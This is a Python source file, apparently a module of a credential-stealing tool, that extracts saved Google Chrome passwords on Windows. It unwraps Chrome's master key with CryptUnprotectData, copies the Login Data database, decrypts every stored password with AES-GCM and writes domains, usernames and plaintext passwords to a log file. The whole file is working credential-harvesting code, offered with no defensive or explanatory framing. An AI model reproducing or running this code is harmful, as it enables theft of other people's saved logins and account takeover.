import base64
import json
import os
import shutil
import sqlite3
import win32crypt
import Cryptodome.Cipher.AES


class ChromePass:
    """
    Collects saved chrome passwords from device
    """

    def __init__(self, chromepass_filename: str) -> None:
        """
        Constructor

        :param chromepass_filename: The name of the file to save the log to
        """
        self.chromepass_filename = chromepass_filename

    def get_key(self) -> str:
        """
        Gets the key to decrypt the chrome data
        """
        # Load the google chrome local state file and read it as a json
        local_state_file = r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE'])
        local_state = json.loads(open(local_state_file).read())
        # Locate the secret key and decode it so it is usable
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Filter the key from the first few letters which are not part of the key and decrypt it with the 
        # user specific microsoft function CryptUnprotectData 
        key = key[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return key

    def decrypt(self, raw_encrypted, key: str) -> str:
        """
        Decrypts the data from chrome

        :param raw_encrypted: The raw passsword from the login data file
        :param key: The secret key for deciphering
        """

        # Get the AES initializations vector
        AES_vector = raw_encrypted[3:15]
        # Encrypted passowrf is 192 bits so we remove the unnecessary suffix
        encrypted = raw_encrypted[15:-16]
        # Get the cipher, decrypt the raw password and decode it
        cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_GCM, AES_vector)
        decrypted = cipher.decrypt(encrypted)
        decrypted = decrypted.decode()
        return decrypted

    def get_chrome_pass(self) -> None:
        """
        Function to get the passwords stored in Google Chrome
        """
        # String where the data will be loaded into
        login_data = ""
        # Path to the file where the credinitials are saved
        path = r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data" % (os.environ['USERPROFILE'])
        key = self.get_key()
        # Temporary file copy
        shutil.copy2(path, "logindata.db")
        # Use sqlite3 to load the file as a database and select only relevant information
        conn = sqlite3.connect("logindata.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        # Loop through all the elements selected and add the username, url and decrypted passwords and then clsoe eevrything down
        for element in cursor.fetchall():
            if element[0] != "" and element[1] != "" and element[2] != "":
                login_data += "\n\nDomain: " + element[0] + "\n   user: " + element[1] + "\n    Pass: " + self.decrypt(
                    element[2], key)
        cursor.close()
        conn.close()
        os.remove("logindata.db")

        # Write passwords to a file
        with open(self.chromepass_filename, "w") as f:
            f.write(login_data)
